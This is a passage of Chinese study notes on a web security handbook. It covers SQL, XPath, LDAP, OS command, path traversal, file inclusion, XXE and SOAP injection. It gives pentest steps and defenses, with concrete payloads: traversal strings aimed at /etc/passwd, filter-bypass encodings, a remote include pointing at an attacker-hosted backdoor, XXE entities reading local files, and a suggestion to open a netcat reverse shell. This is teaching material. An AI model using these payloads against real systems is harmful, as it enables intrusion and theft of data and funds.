语句用于插入数据行，攻击可利用漏洞来为自己创建管理员账户；有时不知道插入值需要多少个参数，此时需要挨个添加（添加整数1或2000），并进行测试； UPDATE 语句用于修改表中一行或多行的数据；UPDATE 与 INSERT 很像，区别在于多了 WHRER 部分来指定待更新的行； 对 UPDATE 的漏洞进行探查有很大的风险，因为它很有可能一不小心就修改了数据库里面的很多数据； DELETE 语句用于删除表中一行或者几行的数据；运行机制很像 UPDATE 语句，它同样也有很大的破坏当前数据库的风险； 查明 SQL 注入漏洞正常情况下，所有提交给服务端的参数，最终可能都会传递到数据库函数进行处理；因此，通过检查这些提交的数据项，发现可能存在的漏洞； 有时候应用程序会从多个请求中收集数据，待收集完整后，才会写入数据库，因此，如果有多阶段的过程，需要对该功能发送的所有数据进行遍历；如果只处理单个请求，则可能会遗漏漏洞； 注入字符串数据渗透测试步骤 提交一个单引号作为目标查询的数据，观察是否会造成错误，或查询结果与原始结果不同； 如果发现错误或者异常行为，在提交的数据中包含两个单引号（连着，单引号的转义），看会如何反应；如果错误或异常消失，则表明很可能有注入漏洞； 使用 SQL 连接符，在提交的数据中增加一个等同于正常输入的字符串，来进一步核实漏洞是否存在；不同数据库软件的连接符不同： MySQL: ‘ ‘FOO （注：两个引号之间有空格） MS-SQL: ‘+’FOO Oracle: ‘||’FOO 可在特定的查询参数中使用 SQL 通配符 %，看是否会返回更多的结果，如果是的话，说明提交的数据正与后端数据库交互； 在提交的输入中添加单引号后，如果服务端返回这个输入的话，会导致客户端的 js 脚本在处理它时出现报错；因为单引号在 js 里面也一个关键字符； 注入数字数据一般情况下，当数字参数传输到服务端时，一般应用程序会将其加单引号处理，但有时候也有可能没有处理，直接发给数据库软件； 渗透测试步骤： 尝试输入一个运算结果等于原始结果的算术表达式，例如原始值为2，则输入 3-1，或者 1+1；如果应用程序仍然能够正常反应，则存在注入漏洞； 如果前面的方法取得成功，则接下来可以使用更加复杂和特殊的 SQL 关键字和语法的表达式进一步探查该漏洞，例如使用 ASCII 命令来将字符或数字转成数值类型的 ASCII 码，例如 67-ASCII(A）等同于 67-65，也即等于2； 如果单引号被过滤掉，则前面的方法可能无效；此时可以利用数据库会解析 ASCII 命令的特点，例如：51-ASCII(1) 等于 51-49，也即等于2； 在使用特殊字符探查 SQL 注入漏洞时，需要提前留意一点，即输入是需要先被 HTML 编码之后，才会传输到服务端时，因此我们还需要将字符进一步转为 HTML 编码，才能达到预期的目标； &amp; 和 &#x3D; 在 HTML 中应该以 %26 和 %3d 来表示； 查询字符串不允许有空格，因此空格需要使用 %20 或者 + 来表示； 如果要在字符串中使用 + ，则需要使用 %2b 对其编码；例如：1+1 应以 1%2b1 进行提交； 分号用于分隔 cookie 字段，需要使用 %3b 对其编码； 注入查询结构在 SQL 语句中，有一些关键字，例如：ORDER BY, WHERE 等，这些关键字跟着一些列名，来达到预期的目标；而这些列名在有些应用程序中是由客户端提交的数据来指定的； 渗透测试步骤 记下任何可能控制应用程序返回的结果的顺序，或者结果的类型的参数； 提交一系列在参数值中使用数字值的请求，从数字1开始，然后逐个请求递增； 如果更改的数字会影响结果的顺序，则说明输入很可能被用于 ORDER BY 子句中，因为在 ORDER BY 之后的数字，表示按第几列进行排序；如果数字超过了总列数，则查询会失败；在数字后面使用 ASC – 或者 DESC – 来观察返回的结果是否顺序会变化； 如果提交的数字 1 生成一组结果，其中有一列都包含该数字，则表示该数字被用于插入到返回的结果的某一列中；即 SELECT 1, title, year FROM books WHERE publisher&#x3D;’Willy’ 虽然在 ORDER BY 之后接的是列名称，因此不能再注入 UNION, WHERE, OR, AND 等关键字，但可以指定一个嵌套查询来实现注入； “指纹” 识别数据库根据数据库使用哪种连接符，可以判断其使用的哪一种数据库；将原本某个正常的字符串参数，改成由连接符连接的格式，看服务端能否正常返回结果； 对于数字格式的参数，使用以下攻击字符串来识别，它在匹配的数字库中表示 0，在不匹配的数据库中则会出现错误； MySQL 在处理行内注释时，有一个特点，当行内注释以感叹号 ！开头时，表示进行版本号的判断，如果当前数据库的版本号大于等于注释中的版本号，则注释中的内容会被解析和执行；因此可以利用这一点，插入相应的语句，来识别数据库的版本，例如： UNION 操作符SQL 使用 UNION 将两个或多个的 SELECT 语句的查询结果合并起来；如果一个 SELECT 语句出现漏洞，意味着可以使用 UNION 来执行另一次完全独立的查询，并将其结果和第一次的查询结果组合到一起； 但是 UNION 也有一些限制： 查询结果的列数需要是相同的；每列的数据类型需要是兼容的； 需要知道另一个表的名称和列的名称； 渗透测试步骤 先查明所需的列数；利用 NULL 被转换为任何数据类型的这一特点，逐个增加 NULL 直到查询被执行； 第二项任务是找到一个数据类型为字符串的列，使用 ‘a’ 逐个取代一个 NULL，如果查询得到执行，将看到另一行包含 a 值的数据，然后可以使用相关列从数据库中提取数据； 提取有用的数据想获得有用的数据，需要知道列的名称；而列的名称经常保存在数据库元数据的表中（例如 MS-SQL 中的 information_schema.columns），通过查询该表来获得表和列的名称； 使用 UNION 提取数据 使用 NULL 找到列数； 查找元数据表，得到表名称和列名称； 开始提取数据 避开过滤避免使用被阻止的字符 使用 SQL 的内置函数来动态构建字符串， 如果注释符号被净化，可以设计为真的表达式； 避免使用简单确认有时候应用程序使用黑名单来净化，则是可以将注入的数据用复杂一些的表达式，例如： 使用 SQL 注释SQL 允许在行内插入注释，这意味着可以利用这个特性来避开净化，或者冒充空格； 利用有缺陷的过滤应用程序有可能没有使用递归的方式来过滤，因此可以增加一个外层骗过它； 二阶 SQL 注入有些应用程序允许用户的输入项中包含特殊的字符，当输入到达服务端时，应用程序会对其进行转义，这会导致注入失去效果；但是此时存在一些微妙的问题，存入数据库的特殊字符被转义了，但当下次它被查询并取出来的时候，有可能没有适当处理，然后可能再次帮为参数参加其他的 SQL 查询，此时将触发一个漏洞； 原理：将 SQL 注入语句先做为正常值存起来，然后再调用查询的命令将把它取出来，从而触发注入； 高级利用有些攻击者不一定使用注入来获取数据，它甚至有时候用来破坏数据库； 获取数字数据可利用 ASCII 和 SUBSTRING 两个函数将字符转成数字；这样如果想得到一串数字，可以用字符串转化并拼接出来； 使用带外通道虽然有时候可以实现注入查询，但是查询的结果却不一定被应用程序返回给浏览器，但是可以利用数据库的内置功能，让它与攻击者设立的目标数据库建立连接，将查询结果传输到攻击者创建的数据库； MS-SQL 的 openrowset 功能； Oracle 的各种包，包括 UTL_HTTP 、UTL_INADDR、UTL_SMTP、UTL_TCP； MySQL 的 INTO OUTFIL 命令可以将结果写入一个文件，通过在两台计算之间建立 SMB 共享，可以实现文件的匿名写入； 另外通过提升数据库权限，还可以利用操作系统的功能来和外部建立连接以传送数据； 使用推论：条件式响应由于防火墙的关系，有时候带外通道并一定能够成功；此时还有另外一种比较费劲的办法，即通过设置不同的查询条件，应用程序会出现不一样的行业，来判断自己所猜测的信息是否是命中了；例如让数据库报错，此时应用程序有可能会返回 500 的错误，从而得到反馈； SELECT X FROM Y WHERE C，当条件 C 满足时，才会求 X 表达式的值，如果 C 不满足，则不会触发 X 表达式的计算；此时，我们可以设置 X 表达式为一个求值会报错的表达式，例如进行除零云计算，这样我们就可以在 C 中放置我们想探查的信息，如果查询成功，就会触发报错；如果查询失败，则不会触发报错； 我们可以逐个字节的探查猜测是否正确，例如对于字符串类型的用户名，我们可以探查第一个字母是否为 A，如果不是就看是否为 B，以此类推；当猜测出来后，再开始探查第二个字母，不断循环；使用这种方法可以探查数据库中的每一条记录； 使用时间延迟猜测的依据除了建立在应用程序是否报错的基础上，也可以建立在应用程序的响应时间上；例如不同数据库有内置不同的延迟命令，可以调取这个命令来制造时间延迟；有些数据库没有时间延迟函数，这时可以让它作一次密集运算，或者让它连接一个不存在的服务器来增加延迟； SQL 注入之外：扩大数据库攻击范围除了应用程序外，数据库本身也是存在漏洞的；因此，除了攻击应用程序本身，还可以通过攻击数据库服务器来达到相同的目的； MS-SQLMS-SQL 有一个内置的 xp__cmdshell 功能，可以使用数据库账户执行系统级的命令，中，虽然默认情况下，该功能是关闭的，但是如果应用程序的账户拥有足够大的权限，则它可以通过开启这项功能，然后利用它来完全控制数据库服务器的操作系统； OracleOracle 的漏洞更多，只要通过实现 SQL 注入，就大概率可以利用其漏洞控制整个数据库； MySQL与前面两个数据库相比，MySQL 中可用攻击者利用的内置功能相对比较少；MySQL 允许读取或写入文件到文件系统中；因此如果数据库账户拥有 FILE_PRIV 权限，则可以打开相关文件访问数据库中的任何数据； 另外 MySQL 允许用户打开动态库文件，因此攻击者可提前创建一个能够实现自己目的的二进制文件，然后通过 MySQL 去读取它，间接实现命令的执行； 使用 SQL 注入工具探测 SQL 注入漏洞的过程需要提交大量的请求，目前已经有这方面的自动化工具，但这些工具还没有达到智能化的程度，在使用前，需要攻击者做一些设置，才能够更有效的提高攻击效率和成功率； SQL 语法与错误参考SQL 语法不同的数据库语法之间有一些差别，因此需要因地制宜，使用匹配后端数据库的语法； SQL 错误消息不同的数据库其报错的消息格式和内容也不一样，并且这些报错消息意味着不同的漏洞可能性； 防止 SQL 注入部分有效的防御措施 对用户输入的所有单引号进行配对； 使用存储过程； 参数化查询 指定查询结构，预留占位符； 指定每个占位符的内容； 深层防御 当应用程序访问数据库时，应尽量采用最低权限的账户； 尽量删除或禁用数据库的那些不必要的功能；内置功能越强大越多，漏洞也越多； 及时安装数据库软件的补丁； 注入 NoSQLNoSQL 虽然是非关系型数据库的统称，但是其实涵盖很多种类型的数据库，每一种数据库的使用方式都完全不同，因此针对不同的 NoSQL 数据库需要使用不同的攻击方法； 作者在写作这本书的时候，这方面的研究才刚开始，但现在这个阶段估计应该有一些成功的办法了； 注入 XPathXPath 是一个处理 XML 文档的工具，用来从 XML 文档中读取或写入数据；但是 XML 并不是保存应用程序数据的传统方式，它一般用来保存一些配置类型的数据为主，或一些简单的信息，例如角色、权限等； XPath 注入的方式跟 SQL 差不多，例如都同样可以使用条件判断逐个字节的获得信息；XPath 同样也有一些内置的函数可供利用； 有时候我们并不知道后面是否使用 XPath，但如果发现某个 SQL 漏洞，但却无法加以利用，则应考虑一下 XPath 的可能； 注入 LDAPLDAP 是 lightweight directory access protocol 的简称，表示轻量级的访问协议，它用来提供访问网络中的目录； LDAP 使用一些逻辑运算符来做条件判断；由于它独特的语法形式，常规的 SQL 注入技巧在 LDAP 并不适用；通常来说， LDAP 的注入难度更大一些；不过如果结合其语法来提交输入，也是存在注入的可能； LDAP 在处理 NULL 字节方面存在漏洞，该单词在 LDAP 表示字符串终止；攻击者可以利用这个漏洞，达到和 SQL 的注释符相同的效果； 小结本章提到的攻击方式只是注入攻击的冰山一角，如果攻击者利用这类漏洞，将能够在服务器的操作系统上执行命令、检查任意文件，即利用应用程序的漏洞攻破并控制为应用程序提供环境的组件； 10. 攻击后端组件一般来说，很多 Web 应用程序被作为后端服务的中间层，客户端通过访问这个中间层，间接实现对服务器上其他底层组件（例如文件系统）和进程的访问；虽然 Web 应用程序本身设置了安全机制，但是对于应用程序来说安全的数据，有可能对于底层组件来说并不是安全的。攻击者有可能利用该漏洞，绕过应用程序的检查，实现对底层组件的调用和控制； 注入操作系统命令有些应用程序会基于用户的输入，生成相应的命令，发送给操作系统执行，这将可能被攻击者利用的漏洞，因为可以设计专门的输入，修改开发者想要执行的命令；这类漏洞特别经常出现在为内部人员提供管理服务器的界面的应用程序中，因为这类管理需求需要直接跟操作系统打交道； 有些命令使用的是字符串拼接的方式，然后发给脚本语言本身提供的系统调用函数来执行；有些脚本语言使用 eval 函数将字符串解析为待执行的代码； 查找 OS 命令注入漏洞不同的 shell 解释器有不同的字符处理方式，应用程序调用的 shell 有很多种可能性，因此需要先想方法对假设进行验证； 可在原命令中注入新命令的字符： ; | &amp; 等三个字符可用于将几个命令连接起来；而且在不同的 shell 解释器中，成对使用它们可达到不同的效果； 反引号 &#96; 可用于将一个独立的命令包含在最初命令处理的数据中；例如把一个注入命令放在反引号中，shell 就会先执行该命令，然后用执行的结果代替被反引号包含的文本，然后执行替代后的新命令字符串； 注入命令的一个常见问题是执行的结果并不会返回，因此并不知道注入是否成功，但是只要漏洞存在，就会有一些探查的方法，例如通过时间延迟来判断； 渗透测试步骤 通过 ping 及其时间参数，让操作系统在接下来的一段时间访问本地的回环接口（即 127.0.0.1）来制作延迟； 如果发生时间延迟，则说明漏洞有可能存在；接下来可以通过命令选项 -i 或 -n 逐渐递增间隔或次数，观察延迟的时间是否跟着增加；如果是的话，说明漏洞很大可能存在，同时也可以排除延迟是因为网络造成的； 使用可成功实施攻击的注入字符串，尝试注入更有用的命令（例如 ls 或 dir），看是否能够将命令结果返回到浏览器上； 如果无法将结果返回给浏览器，则可以尝试建立带外通道 例如使用 TFTP 将工具上传到服务器，使用 telnet 或 netcat 建立一个和自己的计算相连接的反向 shell，然后使用 mail 命令通过 SMTP 发送命令执行结果； 可以将命令的结果重定向的某个可以公开访问的静态资源文件夹，然后通过浏览器访问它； 一量找到注入命令的方法并能够获得命令执行结果，接下来应当确定自己的权限（例如使用 whoami 命令，或者尝试给某个写保护的文件夹写入一个无害的文件）；确定权限后，就设法提升自己的权限，或者借由该服务器攻击其他主机； 有时候应用程序会过滤掉某些符号和字符，导致无法注入独立的系统命令；尽管如此，攻击者仍然有机会破坏开发者设定的命令行为；例如通过故意提供错误的输入，让命令报错，并将错误重定向到某个可执行文件中；而攻击者提供的错误输入，可能故意夹杂着可执行代码；随后通过浏览器访问可执行文件，执行混入的代码； &lt; 和 &gt; 两个符号可以用来重定向，当不能执行独立的命令时，如果这两个符号可用，则可以利用它们来读取或写入任意的文件内容； 操作系统的命令通常支持大量的参数，参数之间同样使用空格间隔；如果应用程序基于用户的输入来生成这些参数，则可以通过在参数中混入空格，然后提供额外的参数，实现攻击效果，例如利用 -O 参数将内容写入任意的文件； 有时应用程序会过滤空格，此时可以通过调用包含空格符字段的环境变量 $IFS 来实现空格的效果； 查找动态执行漏洞动态执行漏洞常见于 PHP 和 Perl 等语言；但绝大多数应用程序平台都可能向基于脚本的解释器传送用户提供的输入； 渗透测试步骤 理论上用户提供的任何数据都可以提交给动态执行函数；其中最常见的数据项是是cookie 名称和参数值； 尝试轮流向目标参数提交下列值，观察它们的返回结果 ;echo%20111111 echo%20111111 response.write%20111111 :response.write%20111111 如果字符串 111111 被单独返回，说明该字符串前面没有其他字符串，因此该处可能存在注入漏洞； 如果字符串 111111 未被返回，说明存在其他字符串，此时应寻找输入被动态执行的错误消息；根据需要对语法进行调整，以实现注入任意的命令； 如果攻击的应用程序是 PHP，可以使用测试字符串 phpinfo()；如果它被成功执行，会返回 PHP 的配置信息； 如果应用程序可能存在注入漏洞，则同样可以通过制造延迟的方法来确认漏洞的存在，例如：system(‘ping%20127.0.0.1’) 防止 OS 命令注入防止 OS 命令注入的最好办法是一劳永逸的避免在程序中直接调用操作系统的命令，而是改由调用内置的 API 来实现；如果实在无法做到，则应该对用户的输入进行严格的控制，例如增加一份白名单，限制长度，并只需要字母和数字，不得包含任何的符号； 应用程序应尽量使用内置的 API 的名称和参数来启动目标进程，而不是直接向 shell 解释器传递命令字符串，这样可以利用内置 API 的检查机制来增加额外的保护； 防止脚本注入漏洞最佳方法是避免将任何用户提供的输入，直接传给任何动态执行函数；如果无法做到，则应该建立严格的白名单； 操作文件路径有些 Web 应用程序提供某个功能，该功能支持接受用户输入的一个文件名或者路径名，然后应用程序调用系统的 API 查找或读取该文件或目录；如果没有对用户提交的输入进行严格的检查，就有可能存在注入的漏洞； 路径遍历漏洞有些 Web 应用程序根据客户端提交的文件名，通过拼接路径的方式，读取并返回服务器上存储的静态文件（或者是将数据写入到服务器上面）；攻击者可以在文件名参数中加入 .. （点点）符号，来遍历整个文件树，读取甚至修改一些敏感信息，从而获得整个服务器的控制权； 虽然这种漏洞形式被广泛应用，常见的 Web 应用框架会采取一些防御措施，例如对客户端的输入进行过滤；但是这仍然无法阻止技术熟练的攻击者。 查找和利用路径遍历漏洞确定攻击目标在对应用程序分析的步骤中，一般就需要确定潜在的攻击面，主要用于文件的上传和下载的功能（例如可共享文档的应用程序、允许用户上传图像的博客、商品信息上传的拍卖平台、为用户提供电子书、技术手册、公司报表等信息型应用程序）；这些功能都有一个特征，即需要跟文件系统进行交互； 渗透测试步骤 在解析应用程序功能的过程中，留意在请求参数中带有文件名或目录名的情形，例如 include&#x3D;main.inc 或者 template&#x3D;&#x2F;en&#x2F;sidebar；或者需要从服务端的文件系统中读取数据的功能，例如显示和下载图像； 在测试其他漏洞的过程中，留意一些反常事件或者有益的错误消息，看看是否有可能是因为用户提交的数据被传递给文件系统的 API 或者作为操作系统命令的参数； 探查路径遍历漏洞当找到潜在的攻击目标后，设法确定漏洞是否存在，例如可以提交一个不会回溯到起始目录的遍历序列，例如将 file&#x3D;foo&#x2F;file.txt 参数修改为 file&#x3D;foo&#x2F;bar&#x2F;..&#x2F;file1.txt； 如果服务端返回相同的结果，则说明漏洞很可能存在； 如果返回结果不同，则说明应用程序有对输入进行一定的过滤处理；此时需要找到过滤的规则，看是否有可能绕过它； 如果发现漏洞可能存在，则尝试遍历出起始目录，例如可提交参数： 12../../../../../../n.ini# 注：此处 ../ 的数量需要反复试验 如果幸运的话，有可能得到如下结果： 如果所攻击的功能拥有文件的写入权限，则可能不好确定该功能是否存在漏洞；因此需要确定一下写入的权限具体有多大；确定的办法是写两个文件：一个是任意用户均可实现写入的文件，另一个是即使根用户或者管理员也无法写入的文件；如果两次请求之间，应用程序表现出差异，则说明漏洞存在； 关于文件路径的分隔符，Win 平台同时支持斜杠和反斜杠，但是 Unix 平台则只运行斜杠，因此最好二者都进行测试，以便能够覆盖并确认服务端使用的是哪种平台，或者哪种平台组件来 避开遍历攻击障碍 应用程序可能只过滤一种序列，因此应同时尝试斜杠和反斜杠，因为文件系统两种格式都支持； 对遍历序列进行 URL 编码，例如点使用 %2e，斜杠使用 %2f，反斜杠使用 %5c 尝试使用 16 位的 Unicode 编码，例如点使用 %u002e，斜杠使用 %u2215，反斜杠使用 %u2216 尝试使用双倍 URL 编码，例如点使用 &amp;252e，斜杠使用 &amp;252f，反斜杠使用 %255c 尝试使用超长 UTF-8 编码，例如点使用 %c0%2e, %e0%40%ae, %c0ae；斜杠使用 %c0%af, %e0%80%cf, %c0%2f；反斜杠使用 %c0%5c, %c0%80%5c 等； 有很多字符可以使用非法的 Unicode 表示法来表示，它们被许多 Unicode 解码器识别并接受，尤其是 Windows 平台上面的解码器； 服务端正常应使用递归来净化客户端提交的输入，但有可能应用程序没有这么做，此时可以输入双序列，这样被过滤掉一个，仍然可以剩下一个发挥作用，例如： …. &#x2F;&#x2F; 指定后缀服务端有时使用指定后缀的方式来检查客户端提交的请求，渗透测试步骤： 在文件名和合法后缀之间放入一个使用 URL 编码的空字符，例如 “..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00.jpg”；该方法能够生效的原因在于进行文件名检查的执行环境，和最终查找获取文件的环境不同，前者认为合法的字符串，到了获取环境变成了另外一种意思； 有些应用程序会只使用请求中的文件名，不包括后缀，然后自行在代码逻辑中添加后缀，这种情况下，前述的方式仍然可以起作用； 有些应用程序会检查文件名的开头是否是一个合法的目录，这种情况只需要配套使用双点即可避免检查，例如：filestore&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwc； 如果以上针对输入过滤的渗透都无法成功，则应用程序可能实施了多加复合的过滤方式，此时可以先从一个可以成功的请求做为起点，例如 foo.jpg，然后请求 bar&#x2F;..&#x2F;foo.jpg 如果失败的话，则尝试所有可能的遍历序列方式，直到该请求获得成功为止；如果仍然还是不行，则尝试请求 foo.jpg%00.jpg，看是否能够避开过滤；彻底检查应用程序的默认目录，了解它使用的所有过滤方式，然后针对这些过滤方式设计避开的技巧； 处理定制编码有些应用程序会对用户上传文件的文件名使用某种编码方案后，再返回编码后的名称做为访问该文件的 URL 地址；因此，可以利用该编码方案是否对路径进行规范化的漏洞来尝试获取想要的文件； 先通过简单的文件名，测试编码方案，例如上传文件 test.txt，看它编码后的结果，例如为 zM1YTU4NTY2Y； 再尝试上传文件 foo&#x2F;..&#x2F;test.txt，看它编码后的结果是否仍为上一步的结果，还是长度有变化，如果有变化，则意味着应用程序没有对路径进行规范化，因此有漏洞； 尝试提交 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;etc&#x2F;passwd&#x2F;..&#x2F;..&#x2F;tmp&#x2F;foo，它规范化的形式为 &#x2F;tmp&#x2F;foo，得到它的编码结果，然后截短它，以便得到路径的前半部分，这样就可以用来获取 &#x2F;etc&#x2F;passwd 文件；（此处需要留意编码对齐问题，因为类似 Base64 的编码方案是以三个字符为单位的，因此需要在路径中添加合适数量的点号来凑齐字符单位要求，同时不影响结果）； 利用遍历漏洞当发现一个路径遍历漏洞后，通常攻击在服务器上将拥有和应用程序相同的读写权限；该漏洞可以用来做如下事情： 获取操作系统与应用程序的密码文件； 获取服务器和应用程序的配置文件（可用来发现其他漏洞或优化其他攻击）； 可能获取数据库证书文件； 应用程序的数据源，例如 MySQL 数据库文件或 XML 文件； 服务器可执行页面的源代码（可用来做代码审查，搜索代码中的其他漏洞）； 可能包含用户名和会话令牌的应用程序日志文件； 如果发现一个可写入任意的漏洞，则可以利用它在服务器上执行任意命令； 在用户的启动文件夹中创建脚本； 当用户下一次连接时，修改 in.ftpd 等文件执行任意命令； 向一个拥有执行权限的 Web 目录写入脚本，然后通过浏览器访问它们，触发脚本的执行； 防止路径遍历漏洞避免向文件系统传递任何用户提交的数据，是防御路径遍历漏洞的最好办法；如果必须允许用户指定上传文件的名称，则需要设置多重的防御组合： 在对用户提交的文件名进行解码和规范化后，应检查文件名中是否包含路径遍历序列（例如斜杠和反斜杠）和空字节；如果有的话，则判定为恶意请求并停止处理，不得尝试对其进行净化； 应用使用应使用一个硬编码的可访问文件类型的列表，并拒绝访问其他类型文件的请求； 在进行过滤后，应用程序应检查文件是否位于指定的目录中（例如使用 get_full_path 之类的方法，获取文件的绝对路径，然后进行检查）；如果发现不在指定目录，则停止处理请求； 应用程序可使用 chrooted 文件系统来包含被访问文件的目录，该目录会自动忽略尝试向上遍历的请求（大多数 Linux 版本都支持 chrooted 文件系统）； 应用程序应将路径遍历攻击和日志及警报机制融合在一起，任何时候，只要收到一个非法请求，就发出警报，终止该用户的会话，冻结该账户，并通知管理员； 文件包含漏洞有些脚本语言允许使用类似 include 的命令，来将某段代码插入到某个指定的位置，然后执行它们； 远程文件包含PHP 语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件路径，这种缺陷j是 PHP 出现了大量漏洞的根源； 1234# 应用程序接一个位置参数，然后根据该参数调用相应的 php 文件，执行其中的代码# 请求地址：https://whatever-app.com/main.php?country=US$country = $_GET[&#x27;country&#x27;];include( $country . &#x27;.php&#x27;); 由于 PHP 支持外部路径，因此攻击者可以通过传入一个远程 php 文件路径，让应用程序执行攻击想要执行的任意代码； 1# https://whatever-app.com/main.php?country=http://attacker-app.com/backdoor 本地文件包含有些应用程序根据用户的输入，加载并执行某个本地文件，则用户可以利用这个漏洞 让应用程序执行某个本应授权访问才能实现的功能； 访问服务上某些受保护的静态资源：通过将这些文件动态包含到应用程序的页面中，让执行环境将静态内容复制到响应中； 查找文件包含漏洞任何用户提交的数据项都可能产生文件包含漏洞，常常出现于由用户提交参数指定国家语言或者地理位置、由用户提交参数指定服务器的文件名； 远程文件包含的渗透测试步骤： 向每一个目标参数提交一个连接受控制的 Web 服务器资源的 URL，然后监控受控制的服务器是否受到应用程序的请求； 尝试提交一个包含不存在的 IP 地址的 URL，看应用程序是否出现请求超时，如果是，说明应用程序尝试和该 IP 地址建立连接； 如果发现应用程序可受到远程文件包含攻击，则使用相关语言可用的 API，构建一段恶意脚本实施攻击； 本地文件包含的渗透测试步骤： 提交一个请求，指向服务器上一个已知可执行资源的名称，看应用程序的行为是否出现变化； 提交一个请求，指向服务器上一个已知静态资源的名称，看文件内容是否包含在响应中； 如果应用程序可受到本地包含文件攻击，则尝试通过 Web 服务器访问任何原本无法直接访问的敏感功能或资源； 尝试能够利用遍历技巧访问其他目录中的文件； 注入 XML 解释器注入 XML 外部实体标准的 XML 解析库支持使用实体引用，目的是用来在 XML 内部或外部引用数据； 12&lt;!---内部实体在头部定义，以下定义在解析时，会将 testref 替代为指定的 testrefvalue ---&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY testref &quot;testrefvalue&quot; &gt; ]&gt; XML 还支持引用外部实体，该外部实体可用 URL 来指定，届时解析时会访问该 URL，提取其中的值，替换 XML 内部的符号； 123&lt;!---外部实体使用 SYSTEM 关键字来指定，引用时可使用 file 协议（本地文件）或者 http 协议（远程文件）；解析时，将会使用 win.ini 的内容来替代 xxe 字符串，攻击者间接获得 win.ini 的文件内容 ---&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///windows/win.ini&quot; &gt; ]&gt;&lt;Search&gt;&lt;SearchTerm&gt;&amp;xxe;&lt;/SearchTerm&gt;&lt;/Search&gt; http 协议不仅可以用来获取传统意义上的远程服务，其实也可以访问其内网或者本地的其他进程服务； 123&lt;!---获取本地局域网 192.168.1.1 的 25 端口上的邮件服务器---&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:25&quot; &gt; ]&gt;&lt;Search&gt;&lt;SearchTerm&gt;&amp;xxe;&lt;/SearchTerm&gt;&lt;/Search&gt; 通过 http 请求，可发起以下攻击： 可将应用程序变成一个代理服务器，获得该应用程序能够访问的各种敏感内容，包括其内部局域网地址中的内容； 攻击某些应用程序中可通过 URL 进行访问的漏洞； 通过遍历 IP 地址和端口号，测试后端系统哪些端口是开放的；如果该端口有开放，一般在响应时间上有差异；有时候还会在响应中包含端口服务的标题； 注入 SOAPSOAP 的全称是 simple object access protocol，指简单对象访问协议；它使用 XML 标准来封装消息，并在 Web 应用程序的不同模块之间传递这些消息；另外有些大型企业应用也使用 SOAP 在不同计算机之间传递消息，以协同完成某个任务； XML 令人蛋疼的地方在于它是一种解释型语言，有自己的语法格式，因此，可以通过它的语法，改变数据本身的意义 假设某个转账的原始请求为 FromAccount&#x3D;18281008&amp;Amount&#x3D;1000&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit 在处理这个请求时，在 Web 应用程序的后端之间，使用 SOAP 封装的消息，此时请求被转换成如下格式 123456789101112&lt;soap:Envelope&gt; &lt;soap:Body&gt; &lt;pre:Add&gt; &lt;Account&gt; &lt;AccountFrom&gt;18281008&lt;/AccountFrom&gt; &lt;Amount&gt;1000&lt;/Amount&gt; &lt;ClearFunds&gt;False&lt;/ClearFunds&gt; &lt;ToAccount&gt;08447656&lt;/ToAccount&gt; &lt;/Account&gt; &lt;/pre:Add&gt; &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 由于转出账户的余额不足，因此字段 ClearFunds 的值为 False，组件之间传递这条消息的目的是记录这笔交易请求，但同时并不真正转出金额，而是标记为转账失败；攻击者可以通过在原始请求中混入符合 XML 语法的字符，来改变消息的意义； 原始请求更改为： FromAccount&#x3D;18281008&amp;Amount&#x3D;1000True1000&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit 服务器在收到该请求后，如果没有对它进行净化和过滤，最终将解析成如下结果： 1234567891011121314&lt;soap:Envelope&gt; &lt;soap:Body&gt; &lt;pre:Add&gt; &lt;Account&gt; &lt;AccountFrom&gt;18281008&lt;/AccountFrom&gt; &lt;Amount&gt;1000&lt;/Amount&gt; &lt;ClearFunds&gt;True&lt;/ClearFunds&gt; &lt;Amount&gt;1000&lt;/Amount&gt; &lt;ClearFunds&gt;False&lt;/ClearFunds&gt; &lt;ToAccount&gt;08447656&lt;/ToAccount&gt; &lt;/Account&gt; &lt;/pre:Add&gt; &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 此时应用程序的某个组件在处理该消息时，由于遇到的第一个 ClearFunds 字段的值是 True，因此有可能在账户余额不足的情况下，触发转账行为； 另外还可以通过注入注释，让某些 XML 字段失效，并用攻击者自己的元素替换被注释掉的元素； 原始请求设计为： FromAccount&#x3D;18281008&amp;Amount&#x3D;1000True08447656&amp;Submit&#x3D;Submit 服务端解析结果如下： 12345678910111213&lt;soap:Envelope&gt; &lt;soap:Body&gt; &lt;pre:Add&gt; &lt;Account&gt; &lt;AccountFrom&gt;18281008&lt;/AccountFrom&gt; &lt;Amount&gt;1000&lt;/Amount&gt; &lt;ClearFunds&gt;True&lt;/ClearFunds&gt;&lt;ToAccount&gt;&lt;!-- &lt;ClearFundres&gt;False&lt;/ClearedFunds&gt; &lt;ToAccount&gt;--&gt;08447656&lt;/ToAccount&gt; &lt;/Account&gt; &lt;/pre:Add&gt; &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 请求的设计，让某部分 XML 字段被注释掉之后，仍然能够保持整体格式的合法性； 查找并利用 SOAP 注入SOAP 注入漏洞可能不容易发现，主要是任意提交注入标签，会破坏 SOAP 的消息格式，而且只是因为格式错误而返回的错误提示也非常简单，并没有什么利用价值； 渗透测试步骤 轮流在每个参数中提交一个恶意 XML 结束标签，例如 &lt;&#x2F;foo&gt;， 如果没有发生错误，说明输入要么没有插入到 SOAP 消息中，或者输入可能被净化了； 如果出现错误，再提交一对有效的起始与结束标签，例如 &lt;foo&gt;&lt;&#x2F;foo&gt;，如果错误消失了，则说明 SOAP 漏洞很可能存在； 查看提交的数据是否会在响应中返回，如果会的话，查看数据是原封不动的返回，还是以某种方式规范化了；轮流提交以下两个值，”test&lt;foo&#x2F;&gt;“ 和 “test&lt;foo&gt;&lt;&#x2F;foo&gt;“，如果返回的结果是 test，或者是另外一个值，则说明插入成功； 如果 HTTP 请求中包括多个参数，由于不知道这些参数在后端的生成顺序，因此，可以轮流在一个参数中插入注释字符串 